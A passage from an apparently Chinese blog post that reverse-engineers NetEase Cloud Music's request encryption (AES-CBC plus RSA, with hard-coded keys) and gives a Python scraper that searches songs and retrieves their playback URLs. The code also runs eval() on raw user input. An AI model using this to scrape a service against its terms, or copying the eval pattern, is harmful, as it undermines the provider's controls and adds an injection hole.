<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652892407410-1652970678978.png" class width="1652892407410">  
</li>
</ul>
<p>要说大佬最亮眼的地方，就是对网易云加密算法的破解了（“params”和“encSecKey”）</p>
<p>点开 <strong>Headers</strong> 后我们可以发现，除了传统的请求头参数外，本次请求还携带了一个 <strong>Form</strong> 表单，其中有两个参数，分别是 <strong>params</strong> 和 <strong>encSecKey</strong> </p>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652893595871-1652970678978.png" class width="1652893595871"> 
<p>具体来说，是用了 AES 和一些自创的加密算法，本人以前是搞逆向的，所以这些东西还是能应付，就是 JavaScript 有点恼火</p>
<p>搜索 encSecKey 我找到的就是这么一堆东西：</p>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652894215310-1652970678978.png" class width="1652894215310"> 
<p>在网上找个格式化网站进行格式化：</p>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652895300160-1652970678978.png" class width="1652895300160"> 
<p>搜索“encSecKey”：（最好不要搜索“params”）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bKB0x = <span class="built_in">window</span>.asrsea(<span class="built_in">JSON</span>.stringify(i1x), buV7O([<span class="string">&quot;流泪&quot;</span>, <span class="string">&quot;强&quot;</span>]), buV7O(Rg9X.md), buV7O([<span class="string">&quot;爱心&quot;</span>, <span class="string">&quot;女孩&quot;</span>, <span class="string">&quot;惊恐&quot;</span>, <span class="string">&quot;大笑&quot;</span>]));</span><br><span class="line">e1x.data = j1x.cr2x(&#123;</span><br><span class="line">	<span class="attr">params</span>: bKB0x.encText,</span><br><span class="line">	<span class="attr">encSecKey</span>: bKB0x.encSecKey</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>把 window.asrsea 实例化为 bKB0x，然后调用其中的方法“encText”，“encSecKey”</li>
</ul>
<p>搜索“asrsea”：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params">d, e, f, g</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> h = &#123;&#125;,</span><br><span class="line">		i = a(<span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span> h.encText = b(d, g), </span><br><span class="line">           h.encText = b(h.encText, i), </span><br><span class="line">           h.encSecKey = c(i, e, f), </span><br><span class="line">           h</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.asrsea = d, <span class="built_in">window</span>.ecnonasr = e</span><br></pre></td></tr></table></figure>
<ul>
<li>定义“encText”函数：<ul>
<li>利用“a(16)”获取“i”</li>
<li>进行第一次“b”算法</li>
<li>把“b”算法的结果和“i”作为参数，再进行一次“b”算法</li>
</ul>
</li>
<li>定义“encSecKey”函数：<ul>
<li>利用“a(16)”获取“i”</li>
<li>进行一次“c”算法</li>
</ul>
</li>
</ul>
<p>“a”算法的实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> d, e, b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>,</span><br><span class="line">		c = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (d = <span class="number">0</span>; a &gt; d; d += <span class="number">1</span>) e = <span class="built_in">Math</span>.random() * b.length, e = <span class="built_in">Math</span>.floor(e), c += b.charAt(e);</span><br><span class="line">	<span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>从大小写英文字母以及10个数字中随机抽取16个字符拼接成一个新的字符串返回结果 </li>
</ul>
<p>“b”算法的实现：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> c = CryptoJS.enc.Utf8.parse(b),</span><br><span class="line">		d = CryptoJS.enc.Utf8.parse(<span class="string">&quot;0102030405060708&quot;</span>),</span><br><span class="line">		e = CryptoJS.enc.Utf8.parse(a),</span><br><span class="line">		f = CryptoJS.AES.encrypt(e, c, &#123;</span><br><span class="line">			<span class="attr">iv</span>: d,</span><br><span class="line">			<span class="attr">mode</span>: CryptoJS.mode.CBC</span><br><span class="line">		&#125;);</span><br><span class="line">	<span class="keyword">return</span> f.toString()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>通过 <strong>CBC</strong> 模式进行 <strong>AES</strong> 加密，将传入的 a 参数和 b 参数分别作为需要加密的内容和密钥，iv偏移量为一个固定的字符串“0102030405060708”</li>
</ul>
<p>“c”算法的实现：（前两个还好，这一串代码直接给我干沉默了…）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> d, e;</span><br><span class="line">	<span class="keyword">return</span> setMaxDigits(<span class="number">131</span>), </span><br><span class="line">           d = <span class="keyword">new</span> RSAKeyPair(b, <span class="string">&quot;&quot;</span>, c), </span><br><span class="line">           e = encryptedString(d, a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RSAKeyPair</span>(<span class="params">a, b, c</span>) </span>&#123;</span><br><span class="line">       <span class="built_in">this</span>.e = biFromHex(a), </span><br><span class="line">       <span class="built_in">this</span>.d = biFromHex(b), </span><br><span class="line">       <span class="built_in">this</span>.m = biFromHex(c),</span><br><span class="line">       <span class="built_in">this</span>.chunkSize = <span class="number">2</span> * biHighIndex(<span class="built_in">this</span>.m), </span><br><span class="line">       <span class="built_in">this</span>.radix = <span class="number">16</span>,</span><br><span class="line">       <span class="built_in">this</span>.barrett = <span class="keyword">new</span> BarrettMu(<span class="built_in">this</span>.m)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encryptedString</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> f, g, h, i, j, k, l, c = <span class="keyword">new</span> <span class="built_in">Array</span>, d = b.length, e = <span class="number">0</span>; d &gt; e;) c[e] = b.charCodeAt(e), e++;</span><br><span class="line">       <span class="keyword">for</span> (; <span class="number">0</span> != c.length % a.chunkSize;) c[e++] = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span> (f = c.length, g = <span class="string">&quot;&quot;</span>, e = <span class="number">0</span>; f &gt; e; e += a.chunkSize) &#123;</span><br><span class="line">           <span class="keyword">for</span> (j = <span class="keyword">new</span> <span class="built_in">BigInt</span>, h = <span class="number">0</span>, i = e; i &lt; e + a.chunkSize; ++h) j.digits[h] = c[i++], j.digits[h] += c[i++] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">           k = a.barrett.powMod(j, a.e), l = <span class="number">16</span> == a.radix ? biToHex(k) : biToString(k, a.radix), g += l + <span class="string">&quot; &quot;</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> g.substring(<span class="number">0</span>, g.length - <span class="number">1</span>)</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>最后提一下这些函数的参数：（由于我不会断点调试，这里就不展示过程了）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d：&#123;<span class="string">&quot;hlpretag&quot;</span>:<span class="string">&quot;&lt;span class=\&quot;s-fc7\&quot;&gt;&quot;</span>,<span class="string">&quot;hlposttag&quot;</span>:<span class="string">&quot;&lt;/span&gt;&quot;</span>,<span class="string">&quot;s&quot;</span>:<span class="string">&quot;Lily&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;offset&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;total&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;limit&quot;</span>:<span class="string">&quot;30&quot;</span>,<span class="string">&quot;csrf_token&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">e：<span class="string">&quot;010001&quot;</span></span><br><span class="line">f：<span class="string">&quot;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&quot;</span></span><br><span class="line">g：<span class="string">&quot;0CoJUm6Qyw8W8jud&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>参数 <strong>e，f，g</strong> 始终保持不表，由此可见它们是3个常量</li>
<li>只是参数 <strong>d</strong> 中的歌曲名称在变化</li>
</ul>
<p>理解完大佬的代码后，我在他的基础上进行了修改：</p>
<h2 id="白嫖网易云-V1-0"><a href="#白嫖网易云-V1-0" class="headerlink" title="白嫖网易云_V1.0"></a>白嫖网易云_V1.0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Music</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_random</span>(<span class="params">self</span>):</span></span><br><span class="line">        random_str = <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">len_change</span>(<span class="params">self,text</span>):</span></span><br><span class="line">        pad = <span class="number">16</span> - <span class="built_in">len</span>(text) % <span class="number">16</span></span><br><span class="line">        text = text + pad * <span class="built_in">chr</span>(pad)</span><br><span class="line">        text = text.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">aes</span>(<span class="params">self,text, key</span>):</span></span><br><span class="line">        iv = <span class="string">b&#x27;0102030405060708&#x27;</span></span><br><span class="line">        text = self.len_change(text)</span><br><span class="line">        cipher = AES.new(key.encode(), AES.MODE_CBC, iv)</span><br><span class="line">        encrypted = cipher.encrypt(text)</span><br><span class="line">        encrypt = base64.b64encode(encrypted).decode()</span><br><span class="line">        <span class="keyword">return</span> encrypt</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">b</span>(<span class="params">self,text, <span class="built_in">str</span></span>):</span></span><br><span class="line">        first_data = self.aes(text, <span class="string">&#x27;0CoJUm6Qyw8W8jud&#x27;</span>)</span><br><span class="line">        second_data = self.aes(first_data, <span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">return</span> second_data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">c</span>(<span class="params">self,text</span>):</span></span><br><span class="line">        e = <span class="string">&#x27;010001&#x27;</span></span><br><span class="line">        f = <span class="string">&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line">        text = text[::-<span class="number">1</span>]</span><br><span class="line">        result = <span class="built_in">pow</span>(<span class="built_in">int</span>(binascii.hexlify(text.encode()), <span class="number">16</span>), <span class="built_in">int</span>(e, <span class="number">16</span>), <span class="built_in">int</span>(f, <span class="number">16</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">format</span>(result, <span class="string">&#x27;x&#x27;</span>).zfill(<span class="number">131</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_final_param</span>(<span class="params">self,text, <span class="built_in">str</span></span>):</span></span><br><span class="line">        params = self.b(text, <span class="built_in">str</span>)</span><br><span class="line">        encSecKey = self.c(<span class="built_in">str</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;params&#x27;</span>: params, <span class="string">&#x27;encSecKey&#x27;</span>: encSecKey&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_music_list</span>(<span class="params">self,params, encSecKey</span>):</span></span><br><span class="line">        url = <span class="string">&quot;https://music.163.com/weapi/cloudsearch/get/web?csrf_token=&quot;</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/search/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_reply</span>(<span class="params">self,params, encSecKey</span>):</span></span><br><span class="line">        url = <span class="string">&quot;https://music.163.com/weapi/song/enhance/player/url/v1?csrf_token=&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;params=&#x27;</span> + parse.quote(params) + <span class="string">&#x27;&amp;encSecKey=&#x27;</span> + parse.quote(encSecKey)</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=payload)</span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">self,song_name_list,song_url_list,song_num</span>):</span></span><br><span class="line">        num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入播放编号:&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span>(num &lt; song_num):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;开始播放:&quot;</span>+song_name_list[num])</span><br><span class="line">            wb = webbrowser.get(<span class="string">&#x27;windows-default&#x27;</span>)</span><br><span class="line">            wb.<span class="built_in">open</span>(song_url_list[num])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;编号错误&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start</span>(<span class="params">self</span>):</span></span><br><span class="line">        song_url_list = []</span><br><span class="line">        song_name_list = []</span><br><span class="line">        song_num = <span class="number">0</span></span><br><span class="line">        song_search = <span class="built_in">input</span>(<span class="string">&#x27;请输入搜索目标,按回车键进行搜索:&#x27;</span>)</span><br><span class="line">        d = &#123;<span class="string">&quot;hlpretag&quot;</span>: <span class="string">&quot;&lt;span class=\&quot;s-fc7\&quot;&gt;&quot;</span>, <span class="string">&quot;hlposttag&quot;</span>: <span class="string">&quot;&lt;/span&gt;&quot;</span>, <span class="string">&quot;s&quot;</span>: song_search, <span class="string">&quot;type&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">             <span class="string">&quot;total&quot;</span>: <span class="string">&quot;true&quot;</span>, <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;30&quot;</span>, <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">        d = json.dumps(d)</span><br><span class="line">        random_param = self.get_random()</span><br><span class="line">        param = self.get_final_param(d, random_param)</span><br><span class="line">        song_list = self.get_music_list(param[<span class="string">&#x27;params&#x27;</span>], param[<span class="string">&#x27;encSecKey&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;搜索结果如下:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(song_list) &gt; <span class="number">0</span>:</span><br><span class="line">            song_list = json.loads(song_list)[<span class="string">&#x27;result&#x27;</span>][<span class="string">&#x27;songs&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(song_list):</span><br><span class="line">                item = json.dumps(item)</span><br><span class="line">                song_name = json.loads(<span class="built_in">str</span>(item))[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot;：&quot;</span> + song_name)</span><br><span class="line">                d = &#123;<span class="string">&quot;ids&quot;</span>: <span class="string">&quot;[&quot;</span> + <span class="built_in">str</span>(json.loads(<span class="built_in">str</span>(item))[<span class="string">&#x27;id&#x27;</span>]) + <span class="string">&quot;]&quot;</span>, <span class="string">&quot;level&quot;</span>: <span class="string">&quot;standard&quot;</span>, <span class="string">&quot;encodeType&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">                d = json.dumps(d)</span><br><span class="line">                param = self.get_final_param(d, random_param)</span><br><span class="line">                song_info = self.get_reply(param[<span class="string">&#x27;params&#x27;</span>], param[<span class="string">&#x27;encSecKey&#x27;</span>])</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(song_info) &gt; <span class="number">0</span>:</span><br><span class="line">                    song_info = json.loads(song_info)</span><br><span class="line">                    song_url = json.dumps(song_info[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;url&#x27;</span>], ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">                    song_name_list.append(song_name)</span><br><span class="line">                    song_url_list.append(song_url)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;该首歌曲解析失败，可能是因为歌曲格式问题&quot;</span>)</span><br><span class="line">                song_num = i+<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;一共搜索到&#123;&#125;个目标&quot;</span>.<span class="built_in">format</span>(song_num))</span><br><span class="line">            self.choice(song_name_list,song_url_list,song_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;很抱歉，未能搜索到相关歌曲信息&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mus = Music()</span><br><span class="line">    mus.start()</span><br></pre></td></tr></table></figure>
<p>效果展示：</p>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652932443142-1652970678978.png" class width="1652932443142"> 
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652932460709-1652970678978.png" class width="1652932460709"> 
<p>PS：有些歌曲要 VIP，这个我可破解不了，当然也播放不了</p>
<p>更新日志：</p>
<ul>
<li><p>version：v1.0</p>
</li>
<li><p>date：2022.5.19</p>
</li>
<li><p>type：</p>
<ul>
<li>Features：NULL</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li><p>desc：</p>
<ul>
<li>第一代版本，下一个版本打算加上 UI 界面，另外把 VIP 歌曲单独标记出来</li>
</ul>
</li>
</ul>
<h2 id="白嫖网易云-V1-1"><a href="#白嫖网易云-V1-1" class="headerlink" title="白嫖网易云_V1.1"></a>白嫖网易云_V1.1</h2><p>VIP 歌曲标记没有完成，但是 UI 界面做好了</p>
<ul>
<li>PS：还是不会并发，所以爬虫工作的时候UI界面会卡顿</li>
</ul>
<img src="/2022/05/19/%E7%99%BD%E5%AB%96%E7%BD%91%E6%98%93%E4%BA%91/1652970459276.png" class width="1652970459276"> 
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span 